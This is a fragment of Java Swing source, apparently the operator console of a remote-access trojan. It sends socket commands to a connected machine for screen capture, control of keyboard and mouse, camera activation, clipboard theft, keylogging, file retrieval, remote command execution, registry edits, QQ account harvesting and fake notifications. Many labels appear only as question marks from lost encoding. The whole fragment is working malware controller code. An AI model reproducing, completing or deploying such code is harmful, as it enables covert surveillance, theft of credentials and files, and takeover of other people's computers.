        jta.append("-Relieve  ??????????????????" + "\n");
        jta.append("-beep  :)" + "\n");
        jta.setBackground(Color.BLACK);
        jta.setForeground(Color.green);
        JScrollPane jsp=new JScrollPane(jta);
        JPanel jp=new JPanel();
        JTextField jtf=new JTextField(30);
        JButton jb=new JButton("Send");
        jb.setBackground(new Color(0, 250, 0));
        jp.add(jtf);
        jp.add(jb);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        jta.setFont(font);
        jtf.setFont(font);
        frame1.add(jsp,BorderLayout.CENTER);
        frame1.add(jp,BorderLayout.SOUTH);
        frame1.setTitle(str1+"\\"+"?????????");
        frame1.setSize(1000,600);
        frame1.setLocationRelativeTo(null);
        frame1.setVisible(true);
        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
        InputStreamReader reader = new InputStreamReader(socket.getInputStream());
        OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream());
        jb.addActionListener(a->{
            try {
                if(jtf.getText().indexOf("-Screen")!=-1) {
                    Video(writer,reader,dataOutputStream);
                }

                if(jtf.getText().indexOf("-keyboardMouse")!=-1) {
                    controlKeyboardAndMouse(writer);
                }

                if(jtf.getText().indexOf("-Camera")!=-1) {
                    writer.write("-Camera Start");
                    writer.flush();
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    camera(writer);
                }

                if(jtf.getText().indexOf("-Clipboard")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    clipBoard(reader,writer);
                }

                if(jtf.getText().indexOf("-Tasklist")!=-1 ||
                        jtf.getText().indexOf("-SystemInfo")!=-1) {
                    taskList(reader);
                }

                if(jtf.getText().indexOf("-QQNumber")!=-1) {
                    qqNumber(reader);
                }

                if(jtf.getText().indexOf("-File")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    getFile(reader,writer,dataOutputStream);
                }

                if(jtf.getText().indexOf("-RemoteChat")!=-1) {
                    remoteChat(reader,writer);
                }

                if(jtf.getText().indexOf("-command")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    sendCommand(reader,writer);
                }

                if(jtf.getText().indexOf("-Keyboard")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    writer.write("-Keyboard Start");
                    writer.flush();
                    getKeybroad(dataInputStream,writer);
                }

                if(jtf.getText().indexOf("-registry")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    setRegistry(reader,writer);
                }

                if((!(jtf.getText().indexOf("-notification")!=-1)) && (!(jtf.getText().indexOf("-File")!=-1))&&
                        (!(jtf.getText().indexOf("-Clipboard")!=-1)) && (!(jtf.getText().indexOf("-FindWindows")!=-1))
                && (!(jtf.getText().indexOf("-registry")!=-1))&& (!(jtf.getText().indexOf("-command")!=-1))&& (!(jtf.getText().indexOf("-Camera")!=-1))) {
                        Date date = new Date();
                        SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                        String str = jtf.getText();
                        writer.write(str);
                        writer.flush();
                        jta.append(dateFormat.format(date) + ": " + jtf.getText());
                        jta.append("\n");
                        jtf.setText("");
                }

                if(jtf.getText().indexOf("-FindWindows")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    String str = jtf.getText();
                    findWindows(reader,writer);
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                }

                if(jtf.getText().indexOf("-notification")!=-1) {
                    Date date = new Date();
                    SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss");
                    String[] mode = {"??????","??????","??????","??????","New"};
                    String str = (String) JOptionPane.showInputDialog(null,"????????????","????????????",JOptionPane.QUESTION_MESSAGE,null,mode,mode[0]);
                    String s = "";
                    jta.append(dateFormat.format(date) + ": " + jtf.getText());
                    jta.append("\n");
                    jtf.setText("");
                    switch (str) {
                        case "??????":
                            s = "-notification1";
                            String s1 = s + " " + JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE);
                            writer.write(s1);
                            writer.flush();
                            break;
                        case "??????":
                            s = "-notification2";
                            String s2 = s + " " + JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE);
                            writer.write(s2);
                            writer.flush();
                            break;
                        case "??????":
                            s = "-notification3";
                            String s3 = s + " " + JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE);
                            writer.write(s3);
                            writer.flush();
                            break;
                        case "??????":
                            s = "-notification4";
                            String s4 = s + " " + JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE);
                            writer.write(s4);
                            writer.flush();
                            break;
                        case "New":
                            s = "-notification5";
                            String s5 = s + " " + JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE);
                            writer.write(s5);
                            writer.flush();
                            break;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
            }
        });
    }
}